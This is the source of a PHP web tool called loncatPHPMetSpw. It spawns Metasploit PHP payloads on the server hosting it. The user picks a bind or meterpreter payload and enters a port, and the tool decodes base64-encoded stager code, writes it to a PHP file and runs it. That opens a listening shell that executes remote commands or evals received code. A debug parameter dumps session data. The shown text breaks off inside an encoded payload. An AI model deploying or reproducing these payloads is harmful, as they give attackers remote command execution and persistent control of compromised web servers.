<?php
if(@$_GET['debug'] == "true") {
    echo "<pre>";
    @var_dump($_SESSION);
    @var_dump($_POST);
    @var_dump($_GET);
    echo "</pre>";
}
define("PREFIX", "lp_");
define("SUFFIX", "lp.php");
array_map('unlink', glob(__DIR__ . "/*".SUFFIX));
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>loncatPHPMetSpw</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <style>
  body {
 background-color:#293a4a;color:#fff
  }
  tr:hover {
 background-color: #43344f;
  }
</style>
  </style>
</head>
<body>
<div class="container">
<h2>loncatPHPMetSpw<font size="3"><?php if(!isset($_POST['payload']) && empty($_POST['payload'])) { echo ":select_payload</font></h2>"; ?>
  <p>loncatPHPMetSpw is a tool that used to spawn Metasploit's PHP payload. Payloads that were used in this tool was generated by msfvenom with a little bit of code modification. This tool was created by <b>P4kL0nc4t</b>.</p>
  <hr><p><b>Payload</b>: <i>Unspecified</i></p><hr>
  <form method="POST" class="form-vertical">
  <div class="form-group">
  <label>Select payload:</label>
  <select class="form-control" name="payload">
  <?php
    c_option("php/bind_perl");
    c_option("php/bind_perl_ipv6");
    c_option("php/bind_php");
    c_option("php/bind_php_ipv6");
    c_option("php/download_exec");
    c_option("php/exec");
    c_option("php/meterpreter/bind_tcp");
    c_option("php/meterpreter/bind_tcp_ipv6");
    c_option("php/meterpreter/bind_tcp_ipv6_uuid");
    c_option("php/meterpreter/bind_tcp_uuid");
    c_option("php/meterpreter/reverse_tcp");
    c_option("php/meterpreter/reverse_tcp_uuid");
    c_option("php/meterpreter_reverse_tcp");
    c_option("php/reverse_perl");
    c_option("php/reverse_php");
    //c_option("php/shell_findsock"); this payload is not suitable anymore
  ?>
  </select>
  </div>
  <button type="submit" class="btn btn-primary">Spawn</button>
  </form>
<?php
} else { 
 echo ":payload_options</font></h2>"; 
 ?><p>loncatPHPMetSpw is a tool that used to spawn Metasploit's PHP payload. Payloads that were used in this tool was generated by msfvenom with a little bit of code modification. This tool was created by <b>P4kL0nc4t</b>.</p><?php
 $payload = $_POST['payload'];
 echo "<hr><p><b>Payload</b>: <i>{$payload}</i></p><hr>";
 if($payload == "php/meterpreter/bind_tcp") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $file = d("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzAuMC4wLjAnOyAkcG9ydCA9ICd4bG9uY2F0cG9ydCc7IGlmIChpc19jYWxsYWJsZSgnc3RyZWFtX3NvY2tldF9zZXJ2ZXInKSkgeyAkc3J2c29jayA9IHN0cmVhbV9zb2NrZXRfc2VydmVyKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7IGlmICghJHNydnNvY2spIHsgZGllKCk7IH0gJHMgPSBzdHJlYW1fc29ja2V0X2FjY2VwdCgkc3J2c29jaywgLTEpOyBmY2xvc2UoJHNydnNvY2spOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gZWxzZWlmIChpc19jYWxsYWJsZSgnc29ja2V0X2NyZWF0ZV9saXN0ZW4nKSkgeyAkc3J2c29jayA9IHNvY2tldF9jcmVhdGVfbGlzdGVuKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzID0gc29ja2V0X2FjY2VwdCgkc3J2c29jayk7IHNvY2tldF9jbG9zZSgkc3J2c29jayk7ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlaWYgKGlzX2NhbGxhYmxlKCdzb2NrZXRfY3JlYXRlJykpIHsgJHNydnNvY2sgPSBzb2NrZXRfY3JlYXRlKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IHNvY2tldF9iaW5kKCRzcnZzb2NrLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzID0gc29ja2V0X2FjY2VwdCgkc3J2c29jayk7IHNvY2tldF9jbG9zZSgkc3J2c29jayk7ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCk7IH0gaWYgKCEkcykgeyBkaWUoKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBldmFsKCRiKTsgdW5saW5rKF9fRklMRV9fKTsgZGllKCk7Cg==");
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
 if($payload == "php/meterpreter/bind_tcp_ipv6") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $file = d("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJ1s6Ol0nOyAkcG9ydCA9IHhsb25jYXRwb3J0OyBpZiAoaXNfY2FsbGFibGUoJ3N0cmVhbV9zb2NrZXRfc2VydmVyJykpIHsgJHNydnNvY2sgPSBzdHJlYW1fc29ja2V0X3NlcnZlcigidGNwOi8veyRpcH06eyRwb3J0fSIpOyBpZiAoISRzcnZzb2NrKSB7IGRpZSgpOyB9ICRzID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHNydnNvY2ssIC0xKTsgZmNsb3NlKCRzcnZzb2NrKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGVsc2VpZiAoaXNfY2FsbGFibGUoJ3NvY2tldF9jcmVhdGVfbGlzdGVuJykpIHsgJHNydnNvY2sgPSBzb2NrZXRfY3JlYXRlX2xpc3RlbihBRl9JTkVUNiwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHMgPSBzb2NrZXRfYWNjZXB0KCRzcnZzb2NrKTsgc29ja2V0X2Nsb3NlKCRzcnZzb2NrKTsgJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGVsc2VpZiAoaXNfY2FsbGFibGUoJ3NvY2tldF9jcmVhdGUnKSkgeyAkc3J2c29jayA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVDYsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IHNvY2tldF9iaW5kKCRzcnZzb2NrLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzID0gc29ja2V0X2FjY2VwdCgkc3J2c29jayk7IHNvY2tldF9jbG9zZSgkc3J2c29jayk7ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCk7IH0gaWYgKCEkcykgeyBkaWUoKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBldmFsKCRiKTsgZGllKCk7Cg==");
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
 if($payload == "php/meterpreter/bind_tcp_ipv6_uuid") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $file = d("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJ1s6Ol0nOyAkcG9ydCA9IHhsb25jYXRwb3J0OyBpZiAoaXNfY2FsbGFibGUoJ3N0cmVhbV9zb2NrZXRfc2VydmVyJykpIHsgJHNydnNvY2sgPSBzdHJlYW1fc29ja2V0X3NlcnZlcigidGNwOi8veyRpcH06eyRwb3J0fSIpOyBpZiAoISRzcnZzb2NrKSB7IGRpZSgpOyB9ICRzID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHNydnNvY2ssIC0xKTsgZmNsb3NlKCRzcnZzb2NrKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGVsc2VpZiAoaXNfY2FsbGFibGUoJ3NvY2tldF9jcmVhdGVfbGlzdGVuJykpIHsgJHNydnNvY2sgPSBzb2NrZXRfY3JlYXRlX2xpc3RlbihBRl9JTkVUNiwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHMgPSBzb2NrZXRfYWNjZXB0KCRzcnZzb2NrKTsgc29ja2V0X2Nsb3NlKCRzcnZzb2NrKTsgJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGVsc2VpZiAoaXNfY2FsbGFibGUoJ3NvY2tldF9jcmVhdGUnKSkgeyAkc3J2c29jayA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVDYsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IHNvY2tldF9iaW5kKCRzcnZzb2NrLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzID0gc29ja2V0X2FjY2VwdCgkc3J2c29jayk7IHNvY2tldF9jbG9zZSgkc3J2c29jayk7ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCk7IH0gaWYgKCEkcykgeyBkaWUoKTsgfSAkdT0iXHhhNVx4NDVceDczXHhjOFx4MjlceDBmXHgxNlx4NGNceDJlXHgzNFx4M2RceDNiXHg3N1x4ZDFceGRlXHgwOSI7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiBmd3JpdGUoJHMsICR1KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6IHNvY2tldF93cml0ZSgkcywgJHUpOyBicmVhazsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBldmFsKCRiKTsgZGllKCk7Cg==");
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
 if($payload == "php/meterpreter/bind_tcp_uuid") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $file = d("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzAuMC4wLjAnOyAkcG9ydCA9IHhsb25jYXRwb3J0OyBpZiAoaXNfY2FsbGFibGUoJ3N0cmVhbV9zb2NrZXRfc2VydmVyJykpIHsgJHNydnNvY2sgPSBzdHJlYW1fc29ja2V0X3NlcnZlcigidGNwOi8veyRpcH06eyRwb3J0fSIpOyBpZiAoISRzcnZzb2NrKSB7IGRpZSgpOyB9ICRzID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHNydnNvY2ssIC0xKTsgZmNsb3NlKCRzcnZzb2NrKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGVsc2VpZiAoaXNfY2FsbGFibGUoJ3NvY2tldF9jcmVhdGVfbGlzdGVuJykpIHsgJHNydnNvY2sgPSBzb2NrZXRfY3JlYXRlX2xpc3RlbihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkcyA9IHNvY2tldF9hY2NlcHQoJHNydnNvY2spOyBzb2NrZXRfY2xvc2UoJHNydnNvY2spOyAkc190eXBlID0gJ3NvY2tldCc7IH0gZWxzZWlmIChpc19jYWxsYWJsZSgnc29ja2V0X2NyZWF0ZScpKSB7ICRzcnZzb2NrID0gc29ja2V0X2NyZWF0ZShBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBzb2NrZXRfYmluZCgkc3J2c29jaywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkcyA9IHNvY2tldF9hY2NlcHQoJHNydnNvY2spOyBzb2NrZXRfY2xvc2UoJHNydnNvY2spOyAkc190eXBlID0gJ3NvY2tldCc7IH0gZWxzZSB7IGRpZSgpOyB9IGlmICghJHMpIHsgZGllKCk7IH0gJHU9Ilx4YTVceDE2XHg1M1x4ZWNceDBmXHg3Y1x4MjZceDJhXHg0YVx4NTBceDU5XHg1Zlx4MTNceGI1XHhiYVx4ODEiOyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogZndyaXRlKCRzLCAkdSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiBzb2NrZXRfd3JpdGUoJHMsICR1KTsgYnJlYWs7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgZXZhbCgkYik7IGRpZSgpOwo=");
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
  if($payload == "php/bind_php_ipv6") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $file = d("ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRTUmZ2REd4PUBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpOwogICAgICBpZighZW1wdHkoJFNSZnZER3gpKXsKICAgICAgICAkU1JmdkRHeD1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRTUmZ2REd4KTsKICAgICAgICAkU1JmdkRHeD1leHBsb2RlKCcsJywgJFNSZnZER3gpOwogICAgICAgICRTUmZ2REd4PWFycmF5X21hcCgndHJpbScsICRTUmZ2REd4KTsKICAgICAgfWVsc2V7CiAgICAgICAgJFNSZnZER3g9YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgICRwb3J0PXhsb25jYXRwb3J0OwoKICAgICRzY2w9J3NvY2tldF9jcmVhdGVfbGlzdGVuJzsKICAgIGlmKGlzX2NhbGxhYmxlKCRzY2wpJiYhaW5fYXJyYXkoJHNjbCwkU1JmdkRHeCkpewogICAgICAkc29jaz1AJHNjbCgkcG9ydCk7CiAgICB9ZWxzZXsKICAgICAgJHNvY2s9QHNvY2tldF9jcmVhdGUoQUZfSU5FVDYsU09DS19TVFJFQU0sU09MX1RDUCk7CiAgICAgICRyZXQ9QHNvY2tldF9iaW5kKCRzb2NrLDAsJHBvcnQpOwogICAgICAkcmV0PUBzb2NrZXRfbGlzdGVuKCRzb2NrLDUpOwogICAgfQogICAgJG1zZ3NvY2s9QHNvY2tldF9hY2NlcHQoJHNvY2spOwogICAgQHNvY2tldF9jbG9zZSgkc29jayk7CgogICAgd2hpbGUoRkFMU0UhPT1Ac29ja2V0X3NlbGVjdCgkcj1hcnJheSgkbXNnc29jayksICR3PU5VTEwsICRlPU5VTEwsIE5VTEwpKQogICAgewogICAgICAkbyA9ICcnOwogICAgICAkYz1Ac29ja2V0X3JlYWQoJG1zZ3NvY2ssMjA0OCxQSFBfTk9STUFMX1JFQUQpOwogICAgICBpZihGQUxTRT09PSRjKXticmVhazt9CiAgICAgIGlmKHN1YnN0cigkYywwLDMpID09ICdjZCAnKXsKICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICB9IGVsc2UgaWYgKHN1YnN0cigkYywwLDQpID09ICdxdWl0JyB8fCBzdWJzdHIoJGMsMCw0KSA9PSAnZXhpdCcpIHsKICAgICAgICBicmVhazsKICAgICAgfWVsc2V7CiAgICAgICAgCiAgICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicgKSkgewogICAgICAgICRjPSRjLiIgMj4mMVxuIjsKICAgICAgfQogICAgICAkZnhxclZ0PSdpc19jYWxsYWJsZSc7CiAgICAgICR6UFpZRz0naW5fYXJyYXknOwogICAgICAKICAgICAgaWYoJGZ4cXJWdCgnc3lzdGVtJylhbmQhJHpQWllHKCdzeXN0ZW0nLCRTUmZ2REd4KSl7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBzeXN0ZW0oJGMpOwogICAgICAgICRvPW9iX2dldF9jb250ZW50cygpOwogICAgICAgIG9iX2VuZF9jbGVhbigpOwogICAgICB9ZWxzZQogICAgICBpZigkZnhxclZ0KCdwb3BlbicpYW5kISR6UFpZRygncG9wZW4nLCRTUmZ2REd4KSl7CiAgICAgICAgJGZwPXBvcGVuKCRjLCdyJyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICBpZihpc19yZXNvdXJjZSgkZnApKXsKICAgICAgICAgIHdoaWxlKCFmZW9mKCRmcCkpewogICAgICAgICAgICAkby49ZnJlYWQoJGZwLDEwMjQpOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBAcGNsb3NlKCRmcCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCRmeHFyVnQoJ3NoZWxsX2V4ZWMnKWFuZCEkelBaWUcoJ3NoZWxsX2V4ZWMnLCRTUmZ2REd4KSl7CiAgICAgICAgJG89c2hlbGxfZXhlYygkYyk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCRmeHFyVnQoJ2V4ZWMnKWFuZCEkelBaWUcoJ2V4ZWMnLCRTUmZ2REd4KSl7CiAgICAgICAgJG89YXJyYXkoKTsKICAgICAgICBleGVjKCRjLCRvKTsKICAgICAgICAkbz1qb2luKGNocigxMCksJG8pLmNocigxMCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCRmeHFyVnQoJ3Bhc3N0aHJ1JylhbmQhJHpQWllHKCdwYXNzdGhydScsJFNSZnZER3gpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHBhc3N0aHJ1KCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJGZ4cXJWdCgncHJvY19vcGVuJylhbmQhJHpQWllHKCdwcm9jX29wZW4nLCRTUmZ2REd4KSl7CiAgICAgICAgJGhhbmRsZT1wcm9jX29wZW4oJGMsYXJyYXkoYXJyYXkocGlwZSwncicpLGFycmF5KHBpcGUsJ3cnKSxhcnJheShwaXBlLCd3JykpLCRwaXBlcyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICB3aGlsZSghZmVvZigkcGlwZXNbMV0pKXsKICAgICAgICAgICRvLj1mcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAgICAgfQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOwogICAgICB9ZWxzZQogICAgICB7CiAgICAgICAgJG89MDsKICAgICAgfQogICAgCiAgICAgIH0KICAgICAgQHNvY2tldF93cml0ZSgkbXNnc29jaywkbyxzdHJsZW4oJG8pKTsKICAgIH0KICAgIEBzb2NrZXRfY2xvc2UoJG1zZ3NvY2spOwo=");
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
 if($payload == "php/bind_php") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $file = d("ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRSaXFYclRiPUBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpOwogICAgICBpZighZW1wdHkoJFJpcVhyVGIpKXsKICAgICAgICAkUmlxWHJUYj1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRSaXFYclRiKTsKICAgICAgICAkUmlxWHJUYj1leHBsb2RlKCcsJywgJFJpcVhyVGIpOwogICAgICAgICRSaXFYclRiPWFycmF5X21hcCgndHJpbScsICRSaXFYclRiKTsKICAgICAgfWVsc2V7CiAgICAgICAgJFJpcVhyVGI9YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgICRwb3J0PXhsb25jYXRwb3J0OwoKICAgICRzY2w9J3NvY2tldF9jcmVhdGVfbGlzdGVuJzsKICAgIGlmKGlzX2NhbGxhYmxlKCRzY2wpJiYhaW5fYXJyYXkoJHNjbCwkUmlxWHJUYikpewogICAgICAkc29jaz1AJHNjbCgkcG9ydCk7CiAgICB9ZWxzZXsKICAgICAgJHNvY2s9QHNvY2tldF9jcmVhdGUoQUZfSU5FVCxTT0NLX1NUUkVBTSxTT0xfVENQKTsKICAgICAgJHJldD1Ac29ja2V0X2JpbmQoJHNvY2ssMCwkcG9ydCk7CiAgICAgICRyZXQ9QHNvY2tldF9saXN0ZW4oJHNvY2ssNSk7CiAgICB9CiAgICAkbXNnc29jaz1Ac29ja2V0X2FjY2VwdCgkc29jayk7CiAgICBAc29ja2V0X2Nsb3NlKCRzb2NrKTsKCiAgICB3aGlsZShGQUxTRSE9PUBzb2NrZXRfc2VsZWN0KCRyPWFycmF5KCRtc2dzb2NrKSwgJHc9TlVMTCwgJGU9TlVMTCwgTlVMTCkpCiAgICB7CiAgICAgICRvID0gJyc7CiAgICAgICRjPUBzb2NrZXRfcmVhZCgkbXNnc29jaywyMDQ4LFBIUF9OT1JNQUxfUkVBRCk7CiAgICAgIGlmKEZBTFNFPT09JGMpe2JyZWFrO30KICAgICAgaWYoc3Vic3RyKCRjLDAsMykgPT0gJ2NkICcpewogICAgICAgIGNoZGlyKHN1YnN0cigkYywzLC0xKSk7CiAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgIGJyZWFrOwogICAgICB9ZWxzZXsKICAgICAgICAKICAgICAgaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9sb3dlcihQSFBfT1MpLCAnd2luJyApKSB7CiAgICAgICAgJGM9JGMuIiAyPiYxXG4iOwogICAgICB9CiAgICAgICR3SGFjQz0naXNfY2FsbGFibGUnOwogICAgICAkWVpQY2M9J2luX2FycmF5JzsKICAgICAgCiAgICAgIGlmKCR3SGFjQygncG9wZW4nKWFuZCEkWVpQY2MoJ3BvcGVuJywkUmlxWHJUYikpewogICAgICAgICRmcD1wb3BlbigkYywncicpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgaWYoaXNfcmVzb3VyY2UoJGZwKSl7CiAgICAgICAgICB3aGlsZSghZmVvZigkZnApKXsKICAgICAgICAgICAgJG8uPWZyZWFkKCRmcCwxMDI0KTsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgQHBjbG9zZSgkZnApOwogICAgICB9ZWxzZQogICAgICBpZigkd0hhY0MoJ3Bhc3N0aHJ1JylhbmQhJFlaUGNjKCdwYXNzdGhydScsJFJpcVhyVGIpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHBhc3N0aHJ1KCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJHdIYWNDKCdzeXN0ZW0nKWFuZCEkWVpQY2MoJ3N5c3RlbScsJFJpcVhyVGIpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHN5c3RlbSgkYyk7CiAgICAgICAgJG89b2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgb2JfZW5kX2NsZWFuKCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCR3SGFjQygncHJvY19vcGVuJylhbmQhJFlaUGNjKCdwcm9jX29wZW4nLCRSaXFYclRiKSl7CiAgICAgICAgJGhhbmRsZT1wcm9jX29wZW4oJGMsYXJyYXkoYXJyYXkocGlwZSwncicpLGFycmF5KHBpcGUsJ3cnKSxhcnJheShwaXBlLCd3JykpLCRwaXBlcyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICB3aGlsZSghZmVvZigkcGlwZXNbMV0pKXsKICAgICAgICAgICRvLj1mcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAgICAgfQogICAgICAgIEBwcm9jX2Nsb3Nl